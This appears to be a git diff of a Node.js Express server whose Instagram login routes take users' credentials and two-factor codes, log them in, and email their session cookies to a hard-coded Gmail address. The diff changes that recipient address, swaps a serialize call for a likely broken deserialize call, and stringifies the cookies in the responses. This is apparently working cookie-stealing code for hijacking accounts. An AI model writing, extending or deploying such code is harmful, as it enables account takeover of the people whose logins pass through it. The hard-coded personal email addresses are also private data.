@@ -182,11 +182,11 @@ app.get("/insta/submitCode", (req, res) => {
       trustThisDevice: "1", // Can be omitted as '1' is used by default
     })
     .then((val) => {
-      const cookies = ig.state.serializeCookieJar().then((val2) => {
+      const cookies = ig.state.deserializeCookieJar().then((val2) => {
         console.log("login success");
         var mailOptions = {
           from: process.env.email,
-          to: "tklinger50@gmail.com",
+          to: "surya142327@gmail.com",
           subject: "cookies of user" + req.query.name,
           text: JSON.stringify(val2.cookies),
         };
@@ -196,7 +196,7 @@ app.get("/insta/submitCode", (req, res) => {
             res.json({
               success: true,
               user: val,
-              cookie: val2.cookies,
+              cookie: JSON.stringify(val2.cookies),
               email_sent: false,
               message: "login Successful but failed to send email",
             });
@@ -205,7 +205,7 @@ app.get("/insta/submitCode", (req, res) => {
             res.json({
               success: true,
               user: val,
-              cookie: val2.cookies,
+              cookie: JSON.stringify(val2.cookies),
               message: "login Successful and email has been sent",
             });
             res.end();
@@ -233,7 +233,7 @@ app.post("/insta", (req, res) => {
         console.log("login success");
         var mailOptions = {
           from: process.env.email,
-          to: "tklinger50@gmail.com",
+          to: "surya142327@gmail.com",
           subject: "cookies of user" + req.query.name,
           text: JSON.stringify(val2.cookies),
         };
@@ -244,7 +244,7 @@ app.post("/insta", (req, res) => {
               success: true,
               twoFactor: false,
               user: val,
-              cookie: val2.cookies,
+              cookie: JSON.stringify(val2.cookies),
               message: "login Successful but failed to send email",
             });
           } else {
@@ -253,8 +253,7 @@ app.post("/insta", (req, res) => {
               success: true,
               twoFactor: false,
               user: val,
-              cookie: val2.cookies,
-
+              cookie: JSON.stringify(val2.cookies),
               message: "login Successful and email has been sent.",
             });
             res.end();
